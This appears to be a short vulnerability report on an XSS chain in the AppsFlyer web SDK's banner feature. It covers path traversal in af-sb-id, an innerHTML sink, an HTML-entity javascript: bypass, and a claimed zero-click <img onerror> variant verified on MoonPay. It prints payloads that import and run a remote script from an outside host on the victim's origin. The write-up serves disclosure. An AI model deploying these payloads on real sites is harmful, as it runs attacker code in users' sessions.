How It Works

  1. Path traversal: af-sb-id has no validation. ../../ traverses to attacker's AppsFlyer workspace key + creative.
  2. Auto-render: SDK calls AF('banners','showBanner') on page load → reads af-sb-id → fetches attacker's creative → injects via innerHTML (no sanitization).
  3. HTML entity bypass: Creative layout uses javascript:import('//s1n6h.github.io/x.js') — s decodes to s in DOM → live javascript: URI survives.
  4. One tap → JS: <a> covers full banner area. One tap fires javascript:import() → loads and executes x.js on victim's origin.

Zero-Click (Verified)

If the attacker updates their creative to use <img src=x onerror="import('//s1n6h.github.io/x.js')"> instead of <a href>, the XSS fires on page load with zero interaction. Verified on MoonPay: <img onerror> fires automatically via innerHTML — no tap needed. The innerHTML sink allows both approaches.

Root Causes (AppsFlyer SDK)

  1. No validation on af-sb-id before URL construction
  2. No HTML sanitization in _createElement() — raw innerHTML sink
  3. No filtering of javascript: URIs, onerror/onload handlers in creative layouts
  4. Creative script field injected via createElement('script') — bypasses CSP strict-dynamic
